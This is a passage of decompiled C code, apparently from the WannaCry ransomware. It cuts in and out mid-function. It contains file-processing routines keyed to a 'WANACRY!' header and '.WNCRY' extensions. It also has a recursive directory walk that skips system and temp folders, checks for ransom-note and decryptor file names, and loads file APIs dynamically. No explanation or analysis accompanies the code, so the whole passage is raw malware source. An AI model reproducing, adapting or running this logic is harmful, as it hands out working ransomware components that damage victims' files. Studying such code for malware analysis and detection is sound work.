  puStack12 = &DAT_004158c8;
  puStack16 = &DAT_00413050;
  local_14 = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_14;
  local_260 = (HANDLE)0xffffffff;
  local_30 = 0;
  local_268 = 0;
  local_244[0] = 0;
  local_244._1_4_ = 0;
  local_23f = 0;
  local_23d = 0;
  local_264 = 0;
  local_24 = 0;
  local_20[0] = 0;
  local_234 = 0;
  local_8 = 0;
  hFile = (HANDLE)(*DAT_004217a0)(param_1,0x80000000,1,0,3,0,0);
  if (hFile == (HANDLE)0xffffffff) {
    hFile_00 = (HANDLE)0xffffffff;
    goto LAB_00402452;
  }
  GetFileTime(hFile,(LPFILETIME)&local_25c,(LPFILETIME)&local_254,(LPFILETIME)&local_24c);
  iVar1 = (*DAT_004217a8)(hFile,local_244,8,&local_24,0);
  if (iVar1 != 0) {
    iVar1 = 2;
    bVar4 = true;
    piVar2 = (int *)local_244;
    piVar3 = (int *)s_WANACRY__004200e4;
    do {
      if (iVar1 == 0) break;
      iVar1 = iVar1 + -1;
      bVar4 = *piVar2 == *piVar3;
      piVar2 = piVar2 + 1;
      piVar3 = piVar3 + 1;
    } while (bVar4);
    if (((((bVar4) && (iVar1 = (*DAT_004217a8)(hFile,&local_268,4,&local_24,0), iVar1 != 0)) &&
         (local_268 == 0x100)) &&
        ((iVar1 = (*DAT_004217a8)(hFile,*(undefined4 *)((int)this + 0x4c8),0x100,&local_24,0),
         iVar1 != 0 && (iVar1 = (*DAT_004217a8)(hFile,&local_264,4,&local_24,0), iVar1 != 0)))) &&
       (iVar1 = (*DAT_004217a8)(hFile,&local_23c,8,&local_24,0), iVar1 != 0)) {
      if (local_264 == 3) {
        (*_DAT_004217b8)(hFile);
        hFile = (HANDLE)(*DAT_004217a0)(param_1,0xc0000000,1,0,3,0,0);
        if (hFile != (HANDLE)0xffffffff) {
          SetFilePointer(hFile,-0x10000,(PLONG)0x0,2);
          iVar1 = (*DAT_004217a8)(hFile,*(undefined4 *)((int)this + 0x4c8),0x10000,&local_24,0);
          if ((iVar1 != 0) && (local_24 == 0x10000)) {
            SetFilePointer(hFile,0,(PLONG)0x0,0);
            iVar1 = (*DAT_004217a4)(hFile,*(undefined4 *)((int)this + 0x4c8),0x10000,local_20,0);
            if ((iVar1 != 0) && (local_20[0] == 0x10000)) {
              SetFilePointer(hFile,-0x10000,(PLONG)0x0,2);
              SetEndOfFile(hFile);
              hFile_00 = local_260;
LAB_00402497:
              SetFileTime(hFile_00,&local_25c,&local_254,&local_24c);
              if (local_264 == 3) {
                (*_DAT_004217b8)(hFile);
                local_260 = (HANDLE)0xffffffff;
                (*DAT_004217ac)(param_1,param_2);
              }
              if (*(code **)((int)this + 0x4d4) != (code *)0x0) {
                (**(code **)((int)this + 0x4d4))(param_1,param_2,local_238,local_23c,0,local_234);
              }
              _local_unwind2(&local_14,0xffffffff);
              *in_FS_OFFSET = local_14;
              return 1;
            }
LAB_00402376:
            hFile_00 = (HANDLE)0xffffffff;
            goto LAB_00402452;
          }
        }
      }
      else {
        hFile_00 = (HANDLE)(*DAT_004217a0)(param_2,0x40000000,1,0,2,0x80,0);
        local_260 = hFile_00;
        if (hFile_00 == (HANDLE)0xffffffff) goto LAB_00402452;
        iVar1 = FUN_00404af0((void *)((int)this + 4),*(undefined4 **)((int)this + 0x4c8));
        if (iVar1 == 0) {
          iVar1 = FUN_00404af0((void *)((int)this + 0x2c),*(undefined4 **)((int)this + 0x4c8));
          if (iVar1 == 0) goto LAB_00402376;
          local_234 = 1;
        }
        FUN_0040a150((void *)((int)this + 0x54),local_230,(undefined4 *)PTR_DAT_004213b0,local_30,
                     0x10);
        local_2c = local_23c;
        local_28 = local_238;
        while( true ) {
          if ((local_28 < 0) || ((local_28 < 1 && (local_2c == 0)))) {
            SetFilePointerEx(hFile_00,CONCAT44(local_238,local_23c),(PLARGE_INTEGER)0x0,0);
            SetEndOfFile(hFile_00);
            goto LAB_00402497;
          }
          if ((*(int **)((int)this + 0x4d0) != (int *)0x0) && (**(int **)((int)this + 0x4d0) != 0))
          break;
          iVar1 = (*DAT_004217a8)(hFile,*(undefined4 *)((int)this + 0x4c8),0x100000,&local_24,0);
          if ((iVar1 == 0) || (local_24 == 0)) {
            hFile_00 = (HANDLE)0xffffffff;
            goto LAB_00402452;
          }
          bVar4 = local_2c < local_24;
          local_2c = local_2c - local_24;
          local_28 = local_28 - (uint)bVar4;
          FUN_0040b3c0((void *)((int)this + 0x54),*(uint **)((int)this + 0x4c8),
                       *(byte **)((int)this + 0x4cc),local_24,1);
          iVar1 = (*DAT_004217a4)(hFile_00,*(undefined4 *)((int)this + 0x4cc),local_24,local_20,0);
          if ((iVar1 == 0) || (local_20[0] != local_24)) break;
        }
      }
    }
  }
  hFile_00 = (HANDLE)0xffffffff;
LAB_00402452:
  _local_unwind2(&local_14,hFile_00);
  *in_FS_OFFSET = local_14;
  return 0;
}

undefined4 FUN_00402560(wchar_t *param_1) {
  bool bVar1;
  wchar_t *_Str1;
  int iVar2;
  undefined4 uVar3;
  void *local_2d4;
  wchar_t local_2d0 [360];
  
  bVar1 = false;
  wcscpy(local_2d0,param_1);
  _Str1 = wcsrchr(local_2d0,L'.');
  if (_Str1 == (wchar_t *)0x0) {
LAB_004025c9:
    wcscat(local_2d0,u__org_004200f0);
  }
  else {
    iVar2 = _wcsicmp(_Str1,u__WNCRY_0042010c);
    if (iVar2 != 0) {
      iVar2 = _wcsicmp(_Str1,u__WNCYR_004200fc);
      if (iVar2 != 0) goto LAB_004025c9;
    }
    *_Str1 = L'\0';
    bVar1 = true;
  }
  iVar2 = FUN_004020a0(local_2d4,param_1,local_2d0);
  if (iVar2 == 0) {
    (*DAT_004217b4)(local_2d0);
  }
  else {
    iVar2 = (*DAT_004217b4)(param_1);
    if (iVar2 != 0) {
      if (!bVar1) {
        uVar3 = (*DAT_004217ac)(&local_2d4,param_1);
        return uVar3;
      }
      return 1;
    }
  }
  return 0;
}

void FUN_00402650(LPCSTR param_1) {
  int iVar1;
  undefined4 *puVar2;
  wchar_t local_2d0;
  undefined4 local_2ce [179];
  
  iVar1 = 0xb3;
  local_2d0 = L'\0';
  puVar2 = local_2ce;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  MultiByteToWideChar(0,0,param_1,-1,&local_2d0,0x167);
  FUN_00402560(&local_2d0);
  return;
}

// WARNING: Could not reconcile some variable overlaps

undefined4 __thiscall
FUN_004026b0(void *this,wchar_t *param_1,undefined4 param_2,undefined4 param_3,wchar_t *param_4) {
  int **ppiVar1;
  int iVar2;
  DWORD DVar3;
  uint uVar4;
  size_t sVar5;
  BOOL BVar6;
  int *param_1_00;
  int **ppiVar7;
    
  basic_string_unsigned_short_struct_std__char_traits_unsigned_short__class_std__allocator_unsigned_short___
  *this_00;
  undefined4 unaff_ESI;
  int **ppiVar8;
  undefined4 unaff_EDI;
  undefined4 *in_FS_OFFSET;
  undefined4 local_res0;
  undefined4 in_stack_fffffa88;
  byte local_575;
  uint in_stack_fffffa8c;
  wchar_t *param_4_00;
  undefined4 local_56c;
  undefined local_568 [4];
  int **local_564;
  undefined4 local_560;
  int **local_55c;
  undefined local_558 [4];
  int **local_554;
  int *local_54c;
  void *local_548;
    
  basic_string_unsigned_short_struct_std__char_traits_unsigned_short__class_std__allocator_unsigned_short___
  abStack1348 [16];
    
  basic_string_unsigned_short_struct_std__char_traits_unsigned_short__class_std__allocator_unsigned_short___
  abStack1332 [8];
  wchar_t local_52c [4];
  int iStack1316;
  ushort local_520 [4];
  wchar_t awStack1304 [2];
  undefined local_514 [8];
  undefined auStack1292 [700];
  undefined local_250 [44];
  undefined local_224 [536];
  undefined4 uStack12;
  undefined *puStack8;
  undefined4 local_4;
  
  local_575 = (byte)((uint)in_stack_fffffa88 >> 0x18);
  local_4 = 0xffffffff;
  puStack8 = &LAB_0041356e;
  uStack12 = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &uStack12;
  local_564 = (int **)((uint)local_564 & 0xffffff00 | (uint)local_575);
  local_560 = FUN_0040c8f0((void **)0x0,(void *)0x0);
  local_55c = (int **)0x0;
  param_4_00 = (wchar_t *)(in_stack_fffffa8c & 0xffffff00 | (uint)local_575);
  local_4 = 0;
  FUN_0040c8f0((void **)0x0,(void *)0x0);
  local_56c = 0;
  local_4 = CONCAT31(local_4._1_3_,1);
  swprintf(local_52c,(size_t)u__s___004201b8,param_1);
  local_55c = (int **)FindFirstFileW((LPCWSTR)local_520,(LPWIN32_FIND_DATAW)local_250);
  if (local_55c == (int **)0xffffffff) {
    FUN_00402e00(local_568,&local_54c,*local_564,(int *)local_564);
    operator_delete(local_564);
    local_564 = (int **)0x0;
    local_560 = 0;
    FUN_00402e00(local_558,&local_54c,*local_554,(int *)local_554);
    operator_delete(local_554);
    local_56c = 0;
  }
  else {
    do {
      if ((*(int **)((int)this + 0x4d0) != (int *)0x0) && (**(int **)((int)this + 0x4d0) != 0))
      break;
      iVar2 = wcscmp((wchar_t *)(local_250 + 0x2c),(wchar_t *)&_Str2_004201b4);
      if ((iVar2 != 0) &&
         (iVar2 = wcscmp((wchar_t *)(local_250 + 0x2c),(wchar_t *)&_Str2_004201ac), iVar2 != 0)) {
        swprintf((wchar_t *)local_520,(size_t)u__s__s_004201a0,param_4);
        DVar3 = GetFileAttributesW((LPCWSTR)local_520);
        if ((DVar3 & 0x10) == 0) {
          iVar2 = wcscmp((wchar_t *)(local_250 + 0x2c),u__Please_Read_Me__txt_00420174);
          if (((iVar2 != 0) &&
              (iVar2 = wcscmp((wchar_t *)(local_250 + 0x2c),u__WanaDecryptor__exe_lnk_00420144),
              iVar2 != 0)) &&
             (iVar2 = wcscmp((wchar_t *)(local_250 + 0x2c),u__WanaDecryptor__bmp_0042011c),
             iVar2 != 0)) {
            abStack1332[0] = SUB41((uint)local_56c >> 0x18,0);
            _Tidy(abStack1332,false);
            sVar5 = wcslen((wchar_t *)local_520);
            assign(abStack1332,local_520,sVar5);
            FUN_00402da0(local_568,&local_548,local_564,abStack1332);
            this_00 = abStack1332;
            goto LAB_00402957;
          }
        }
        else {
          uVar4 = FUN_00402af0((wchar_t *)local_520,(wchar_t *)(local_250 + 0x2c));
          if (uVar4 == 0) {
            abStack1348[0] = SUB41((uint)local_56c >> 0x18,0);
            _Tidy(abStack1348,false);
            sVar5 = wcslen((wchar_t *)local_520);
            assign(abStack1348,local_520,sVar5);
            FUN_00402da0(local_558,&local_54c,local_554,abStack1348);
            this_00 = abStack1348;
LAB_00402957:
            _Tidy(this_00,true);
          }
        }
      }
      BVar6 = FindNextFileW(local_55c,(LPWIN32_FIND_DATAW)local_250);
    } while (BVar6 != 0);
    FindClose(local_55c);
    ppiVar8 = (int **)*local_564;
    if (ppiVar8 != local_564) {
      do {
        if ((*(int **)((int)this + 0x4d0) != (int *)0x0) && (**(int **)((int)this + 0x4d0) != 0))
        break;
        param_1_00 = ppiVar8[3];
        if (ppiVar8[3] == (int *)0x0) {
          param_1_00 = (int *)_C_exref;
        }
        FUN_00402560((wchar_t *)param_1_00);
        ppiVar8 = (int **)*ppiVar8;
      } while (ppiVar8 != local_564);
    }
    ppiVar8 = (int **)*local_554;
    if (ppiVar8 != local_554) {
      do {
        if ((*(int **)((int)this + 0x4d0) != (int *)0x0) && (**(int **)((int)this + 0x4d0) != 0))
        break;
        param_1_00 = ppiVar8[3];
        if (ppiVar8[3] == (int *)0x0) {
          param_1_00 = (int *)_C_exref;
        }
        FUN_004026b0(this,(wchar_t *)param_1_00,unaff_EDI,unaff_ESI,param_4_00);
        ppiVar8 = (int **)*ppiVar8;
      } while (ppiVar8 != local_554);
    }
    swprintf((wchar_t *)local_520,(size_t)u__s__s_004201a0,param_4);
    (*DAT_004217b4)(local_514);
    swprintf(awStack1304,(size_t)u__s__s_004201a0,param_4);
    (*DAT_004217b4)(auStack1292);
    ppiVar7 = local_564;
    ppiVar8 = (int **)*local_564;
    while (ppiVar8 != ppiVar7) {
      ppiVar1 = (int **)*ppiVar8;
      FUN_00402e90(local_568,(int *)&local_548,(int *)ppiVar8);
      ppiVar8 = ppiVar1;
    }
    operator_delete(local_564);
    ppiVar8 = local_554;
    local_564 = (int **)0x0;
    local_560 = 0;
    local_55c = (int **)*local_554;
    while (local_55c != ppiVar8) {
      ppiVar7 = (int **)FUN_00402d90(&local_55c,&local_548);
      FUN_00402e90(local_558,&iStack1316,*ppiVar7);
    }
    operator_delete(local_554);
    local_56c = 1;
  }
  *in_FS_OFFSET = local_res0;
  return local_56c;
}

uint FUN_00402af0(wchar_t *param_1,wchar_t *param_2) {
  int iVar1;
  wchar_t *pwVar2;
  
  iVar1 = _wcsnicmp(param_1,(wchar_t *)&_Str2_00420394,2);
  if (iVar1 == 0) {
    param_1 = wcsstr(param_1,(wchar_t *)&_SubStr_0042038c);
  }
  else {
    param_1 = param_1 + 1;
  }
  if (param_1 != (wchar_t *)0x0) {
    param_1 = param_1 + 1;
    iVar1 = _wcsicmp(param_1,u__Intel_0042037c);
    if (iVar1 == 0) {
      return 1;
    }
    iVar1 = _wcsicmp(param_1,u__ProgramData_00420360);
    if (iVar1 == 0) {
      return 1;
    }
    iVar1 = _wcsicmp(param_1,u__WINDOWS_0042034c);
    if (iVar1 == 0) {
      return 1;
    }
    iVar1 = _wcsicmp(param_1,u__Program_Files_0042032c);
    if (iVar1 == 0) {
      return 1;
    }
    iVar1 = _wcsicmp(param_1,u__Program_Files__x86__00420300);
    if (iVar1 == 0) {
      return 1;
    }
    pwVar2 = wcsstr(param_1,u__AppData_Local_Temp_004202d8);
    if (pwVar2 != (wchar_t *)0x0) {
      return 1;
    }
    pwVar2 = wcsstr(param_1,u__Local_Settings_Temp_004202ac);
    if (pwVar2 != (wchar_t *)0x0) {
      return 1;
    }
  }
  iVar1 = _wcsicmp(param_2,u__This_folder_protects_against_ra_00420210);
  if (iVar1 == 0) {
    return 1;
  }
  iVar1 = _wcsicmp(param_2,u_Temporary_Internet_Files_004201dc);
  if (iVar1 == 0) {
    return 1;
  }
  iVar1 = _wcsicmp(param_2,u_Content_IE5_004201c4);
  return (uint)(iVar1 == 0);
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_00402c40(void) {
  int iVar1;
  HMODULE hModule;
  
  iVar1 = FUN_00404b70();
  if (iVar1 != 0) {
    if (DAT_004217a0 != (FARPROC)0x0) {
      return 1;
    }
    hModule = LoadLibraryA(s_kernel32_dll_004203f0);
    if (hModule != (HMODULE)0x0) {
      DAT_004217a0 = GetProcAddress(hModule,s_CreateFileW_004203e4);
      DAT_004217a4 = GetProcAddress(hModule,s_WriteFile_004203d8);
      DAT_004217a8 = GetProcAddress(hModule,s_ReadFile_004203cc);
      DAT_004217ac = GetProcAddress(hModule,s_MoveFileW_004203c0);
      DAT_004217b0 = GetProcAddress(hModule,s_MoveFileExW_004203b4);
      DAT_004217b4 = GetProcAddress(hModule,s_DeleteFileW_004203a8);
      _DAT_004217b8 = GetProcAddress(hModule,s_CloseHandle_0042039c);
      if ((((DAT_004217a0 != (FARPROC)0x0) && (DAT_004217a4 != (FARPROC)0x0)) &&
          (DAT_004217a8 != (FARPROC)0x0)) &&
         (((DAT_004217ac != (FARPROC)0x0 && (DAT_004217b0 != (FARPROC)0x0)) &&
          ((DAT_004217b4 != (FARPROC)0x0 && (_DAT_004217b8 != (FARPROC)0x0)))))) {
        return 1;
      }
    }
  }
  return 0;
}

void __thiscall FUN_00402d90(void *this,undefined4 *param_1) {
  undefined4 *puVar1;
  
  puVar1 = *(undefined4 **)this;
  *(undefined4 *)this = *puVar1;
  *(undefined4 **)param_1 = puVar1;
  return;
}

void __thiscall
FUN_00402da0(void *this,void **param_1,void *param_2,
                        
            basic_string_unsigned_short_struct_std__char_traits_unsigned_short__class_std__allocator_unsigned_short___
            *param_3) {
  void **ppvVar1;
  void **ppvVar2;
  void **ppvVar3;
  
  ppvVar3 = *(void ***)((int)param_2 + 4);
  ppvVar1 = (void **)operator_new(0x18);
  ppvVar2 = (void **)param_2;
  if (param_2 == (void *)0x0) {
    ppvVar2 = ppvVar1;
  }
  *(void ***)ppvVar1 = ppvVar2;
  if (ppvVar3 == (void **)0x0) {
    ppvVar3 = ppvVar1;
  }
  *(void ***)(ppvVar1 + 1) = ppvVar3;
  *(void ***)((int)param_2 + 4) = ppvVar1;
  *(void ***)ppvVar1[1] = ppvVar1;
  FUN_00402f10((
                basic_string_unsigned_short_struct_std__char_traits_unsigned_short__class_std__allocator_unsigned_short___
                *)(ppvVar1 + 2),param_3);
  *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
  *(void ***)param_1 = ppvVar1;
  return;
}

void __thiscall FUN_00402e00(void *this,int **param_1,int *param_2,int *param_3) {
  char cVar1;
  int *piVar2;
  int iVar3;
  
  if (param_2 == param_3) {
    *param_1 = param_2;
    return;
  }
  do {
    piVar2 = (int *)*param_2;
    *(int *)param_2[1] = *param_2;
    *(int *)(*param_2 + 4) = param_2[1];
    iVar3 = param_2[3];
    if (iVar3 != 0) {
      cVar1 = *(char *)(iVar3 + -1);
      if ((cVar1 == '\0') || (cVar1 == -1)) {
        operator_delete((void *)(iVar3 + -2));
      }
      else {
        *(char *)(iVar3 + -1) = cVar1 + -1;
      }
    }
    param_2[3] = 0;
    param_2[4] = 0;
    param_2[5] = 0;
    operator_delete(param_2);
    *(int *)((int)this + 8) = *(int *)((int)this + 8) + -1;
    param_2 = piVar2;
  } while (piVar2 != param_3);
  *param_1 = piVar2;
  return;
}

void __thiscall FUN_00402e90(void *this,int *param_1,int *param_2) {
  char cVar1;
  int iVar2;
  int iVar3;
  
  iVar2 = *param_2;
  *(int *)param_2[1] = *param_2;
  *(int *)(*param_2 + 4) = param_2[1];
  iVar3 = param_2[3];
  if (iVar3 != 0) {
    cVar1 = *(char *)(iVar3 + -1);
    if ((cVar1 == '\0') || (cVar1 == -1)) {
      operator_delete((void *)(iVar3 + -2));
    }
    else {
      *(char *)(iVar3 + -1) = cVar1 + -1;
    }
  }
  param_2[3] = 0;
  param_2[4] = 0;
  param_2[5] = 0;
  operator_delete(param_2);
  *(int *)((int)this + 8) = *(int *)((int)this + 8) + -1;
  *param_1 = iVar2;
  return;
}

void __cdecl
FUN_00402f10(
             basic_string_unsigned_short_struct_std__char_traits_unsigned_short__class_std__allocator_unsigned_short___
             *param_1,
                        
            basic_string_unsigned_short_struct_std__char_traits_unsigned_short__class_std__allocator_unsigned_short___
            *param_2) {
    
  basic_string_unsigned_short_struct_std__char_traits_unsigned_short__class_std__allocator_unsigned_short___
  bVar1;
  undefined2 uVar2;
  int iVar3;
  bool bVar4;
  uint uVar5;
  code *pcVar6;
  undefined2 *puVar7;
  undefined2 *puVar8;
  uint uVar9;
  uint uVar10;
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &LAB_00413591;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  local_4 = 0;
  if (param_1 !=
      (
       basic_string_unsigned_short_struct_std__char_traits_unsigned_short__class_std__allocator_unsigned_short___
       *)0x0) {
    bVar1 = *param_2;
    *(undefined4 *)(param_1 + 4) = 0;
    *param_1 = bVar1;
    *(undefined4 *)(param_1 + 8) = 0;
    *(undefined4 *)(param_1 + 0xc) = 0;
    uVar9 = *(uint *)npos_exref;
    uVar5 = *(uint *)(param_2 + 8);
    uVar10 = uVar5;
    if (uVar9 < uVar5) {
      uVar10 = uVar9;
    }
    if (param_1 == param_2) {
      if (uVar10 != 0) {
        _Xran();
      }
      _Split(param_1);
      uVar5 = *(int *)(param_1 + 8) - uVar10;
      if (uVar5 < uVar9) {
        uVar9 = uVar5;
      }
      if (uVar9 != 0) {
        FUN_00403090((undefined2 *)(*(int *)(param_1 + 4) + uVar10 * 2),
                     (undefined2 *)(*(int *)(param_1 + 4) + (uVar9 + uVar10) * 2),uVar5 - uVar9);
        iVar3 = *(int *)(param_1 + 8);
        bVar4 = _Grow(param_1,iVar3 - uVar9,false);
        if (bVar4 != false) {
          _Eos(param_1,iVar3 - uVar9);
        }
      }
      _Split(param_1);
      *in_FS_OFFSET = local_c;
      return;
    }
    if ((uVar10 != 0) && (uVar10 == uVar5)) {
      pcVar6 = *(code **)(param_2 + 4);
      if (*(code **)(param_2 + 4) == (code *)0x0) {
        pcVar6 = _C_exref;
      }
      if ((byte)pcVar6[-1] < 0xfe) {
        _Tidy(param_1,true);
        pcVar6 = *(code **)(param_2 + 4);
        if (*(code **)(param_2 + 4) == (code *)0x0) {
          pcVar6 = _C_exref;
        }
        *(code **)(param_1 + 4) = pcVar6;
        *(undefined4 *)(param_1 + 8) = *(undefined4 *)(param_2 + 8);
        *(undefined4 *)(param_1 + 0xc) = *(undefined4 *)(param_2 + 0xc);
        *(char *)(pcVar6 + -1) = (char)pcVar6[-1] + '\x01';
        *in_FS_OFFSET = local_c;
        return;
      }
    }
    bVar4 = _Grow(param_1,uVar10,true);
    if (bVar4 != false) {
      puVar8 = *(undefined2 **)(param_2 + 4);
      if (*(undefined2 **)(param_2 + 4) == (undefined2 *)0x0) {
        puVar8 = (undefined2 *)_C_exref;
      }
      puVar7 = *(undefined2 **)(param_1 + 4);
      uVar9 = uVar10;
      while (uVar9 != 0) {
        uVar2 = *puVar8;
        puVar8 = puVar8 + 1;
        *puVar7 = uVar2;
        puVar7 = puVar7 + 1;
        uVar9 = uVar9 - 1;
      }
      *(uint *)(param_1 + 8) = uVar10;
      *(undefined2 *)(*(int *)(param_1 + 4) + uVar10 * 2) = 0;
    }
  }
  *in_FS_OFFSET = local_c;
  return;
}

void __cdecl FUN_00403090(undefined2 *param_1,undefined2 *param_2,int param_3) {
  undefined2 *puVar1;
  undefined2 uVar2;
  undefined2 *puVar3;
  
  if ((param_2 < param_1) && (puVar3 = param_2 + param_3, param_1 < puVar3)) {
    param_1 = param_1 + param_3;
    if (param_3 != 0) {
      do {
        puVar1 = puVar3 + -1;
        puVar3 = puVar3 + -1;
        param_1 = param_1 + -1;
        param_3 = param_3 + -1;
        *param_1 = *puVar1;
      } while (param_3 != 0);
      return;
    }
  }
  else {
    if (param_3 != 0) {
      do {
        uVar2 = *param_2;
        param_2 = param_2 + 1;
        *param_1 = uVar2;
        param_1 = param_1 + 1;
        param_3 = param_3 + -1;
      } while (param_3 != 0);
    }
  }
  return;
}

// WARNING: Could not reconcile some variable overlaps

undefined4 * __thiscall FUN_004030e0(void *this,CWnd *param_1) {
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack8 = &LAB_004135b3;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  CDialog((CDialog *)this,0x8a,param_1);
  local_4 = 0;
  CWnd((CWnd *)(undefined4 *)((int)this + 0x60));
  *(undefined4 *)((int)this + 0x60) = 0x415b28;
  local_4 = CONCAT31(local_4._1_3_,1);
  CWnd((CWnd *)(undefined4 *)((int)this + 0xa0));
  *(undefined4 *)((int)this + 0xa0) = 0x415a58;
  *(undefined4 *)((int)this + 0xe4) = 0;
  *(undefined4 *)((int)this + 0xe0) = 0x415a44;
  *(undefined4 *)((int)this + 0xf0) = 0;
  *(undefined4 *)((int)this + 0xec) = 0x415a30;
  *(undefined4 *)this = 0x415958;
  *(undefined4 *)((int)this + 0xf4) = 0;
  *in_FS_OFFSET = local_c;
  return (undefined4 *)this;
}

CDialog * __thiscall FUN_00403180(void *this,byte param_1) {
  FUN_004031a0((CDialog *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (CDialog *)this;
}

// WARNING: Could not reconcile some variable overlaps

void __fastcall FUN_004031a0(CDialog *param_1) {
  undefined4 *this;
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &this_004135ff;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  this = (undefined4 *)(param_1 + 0xec);
  *this = 0x415c00;
  local_4._0_1_ = 4;
  local_4._1_3_ = 0;
  DeleteObject((CGdiObject *)this);
  *this = 0x415bec;
  this = (undefined4 *)(param_1 + 0xe0);
  *this = 0x415c00;
  local_4._0_1_ = 5;
  DeleteObject((CGdiObject *)this);
  *this = 0x415bec;
  local_4._0_1_ = 1;
  _CComboBox((CComboBox *)(param_1 + 0xa0));
  local_4 = (uint)local_4._1_3_ << 8;
  _CListCtrl((CListCtrl *)(param_1 + 0x60));
  local_4 = 0xffffffff;
  _CDialog(param_1);
  *in_FS_OFFSET = local_c;
  return;
}

void __thiscall FUN_00403280(void *this,CDataExchange *param_1) {
  DDX_Control(param_1,0x40d,(CWnd *)((int)this + 0x60));
  DDX_Control(param_1,0x407,(CWnd *)((int)this + 0xa0));
  return;
}

undefined4 __fastcall FUN_004032c0(CDialog *param_1) {
  COLORREF color;
  HBRUSH pHVar1;
  HFONT pHVar2;
  CWnd *pCVar3;
  WPARAM wParam;
  CGdiObject *this;
  
  OnInitDialog(param_1);
  color = *(COLORREF *)(DAT_0042189c + 0x824);
  *(COLORREF *)(param_1 + 0xe8) = color;
  pHVar1 = CreateSolidBrush(color);
  Attach((CGdiObject *)(param_1 + 0xe0),pHVar1);
  this = (CGdiObject *)(param_1 + 0xec);
  pHVar2 = CreateFontA(0x10,0,0,0,700,0,0,0,0,0,0,0,0x20,s_Arial_004206d8);
  Attach(this,pHVar2);
  pCVar3 = GetDlgItem((CWnd *)param_1,0x408);
  if (this == (CGdiObject *)0x0) {
    wParam = 0;
  }
  else {
    wParam = *(WPARAM *)(param_1 + 0xf0);
  }
  SendMessageA(*(HWND *)(pCVar3 + 0x20),0x30,wParam,1);
  pCVar3 = GetDlgItem((CWnd *)param_1,0x409);
  if (this == (CGdiObject *)0x0) {
    wParam = 0;
  }
  else {
    wParam = *(WPARAM *)(param_1 + 0xf0);
  }
  SendMessageA(*(HWND *)(pCVar3 + 0x20),0x30,wParam,1);
  pCVar3 = GetDlgItem((CWnd *)param_1,2);
  if (this == (CGdiObject *)0x0) {
    wParam = 0;
  }
  else {
    wParam = *(WPARAM *)(param_1 + 0xf0);
  }
  SendMessageA(*(HWND *)(pCVar3 + 0x20),0x30,wParam,1);
  pCVar3 = GetDlgItem((CWnd *)param_1,0x40e);
  if (this != (CGdiObject *)0x0) {
    this = *(CGdiObject **)(param_1 + 0xf0);
  }
  SendMessageA(*(HWND *)(pCVar3 + 0x20),0x30,(WPARAM)this,1);
  FUN_00403cb0((int)param_1);
  SendMessageA(*(HWND *)(param_1 + 0xc0),0x14e,0,0);
  InsertColumn((CListCtrl *)(param_1 + 0x60),0,&DAT_004206d0,0,-1,-1);
  SendMessageA(*(HWND *)(param_1 + 0x80),0x101e,0,500);
  DAT_004217bc = param_1;
  return 1;
}

BOOL __thiscall FUN_004034a0(void *this,CDC *param_1) {
  CBrush *pCVar1;
  BOOL BVar2;
  undefined4 *in_FS_OFFSET;
  undefined **local_24 [2];
  tagRECT local_1c;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack8 = &LAB_00413620;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  GetClientRect(*(HWND *)((int)this + 0x20),(LPRECT)&local_1c);
  CBrush((CBrush *)local_24,*(ulong *)((int)this + 0xe8));
  local_4 = 0;
  pCVar1 = SelectObject(param_1,(CBrush *)local_24);
  BVar2 = PatBlt(*(HDC *)(param_1 + 4),0,0,local_1c.right - local_1c.left,
                 local_1c.bottom - local_1c.top,0xf00021);
  SelectObject(param_1,pCVar1);
  local_24[0] = &PTR_LAB_00415c00;
  local_4 = 1;
  DeleteObject((CGdiObject *)local_24);
  *in_FS_OFFSET = local_c;
  return BVar2;
}

void __fastcall FUN_004035a0(int param_1) {
  CString CVar1;
  LRESULT LVar2;
  BOOL BVar3;
  undefined3 extraout_var;
  undefined3 extraout_var_00;
  size_t sVar4;
  int iVar5;
  uint uVar6;
  int local_2f8;
  int iVar7;
  int iVar8;
  undefined4 *puVar9;
  LPCSTR hMem;
  undefined4 *puVar10;
  undefined4 *in_FS_OFFSET;
  CString **wParam;
  LPARAM lParam;
  LPVOID local_2f0;
  LPCSTR local_2ec;
  int local_2e8;
  WCHAR WStack740;
  undefined4 auStack738 [181];
  undefined4 local_c;
  undefined *local_8;
  undefined4 uStack4;
  
  uStack4 = 0xffffffff;
  local_8 = &LAB_0041365c;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  local_2e8 = param_1;
  LVar2 = SendMessageA(*(HWND *)(param_1 + 0x80),0x1004,0,0);
  if ((LVar2 != 0) && (BVar3 = OpenClipboard(*(HWND *)(param_1 + 0x20)), BVar3 != 0)) {
    iVar8 = 0;
    iVar7 = 0;
    LVar2 = SendMessageA(*(HWND *)(param_1 + 0x80),0x1004,0,0);
    if (0 < LVar2) {
      do {
        lParam = 0;
        CVar1 = GetItemText((CListCtrl *)(param_1 + 0x60),(int)&local_2ec,iVar8);
        wParam = &this_004206e0;
        local_8 = (undefined *)0x0;
        operator_((CString *)&stack0xfffffd0c,(char *)CONCAT31(extraout_var,CVar1));
        local_c = CONCAT31(local_c._1_3_,2);
        _CString((CString *)&stack0xfffffd0c);
        local_c = 0xffffffff;
        iVar7 = iVar7 + *(int *)(local_2f8 + -8) * 2;
        _CString((CString *)&stack0xfffffd08);
        iVar8 = iVar8 + 1;
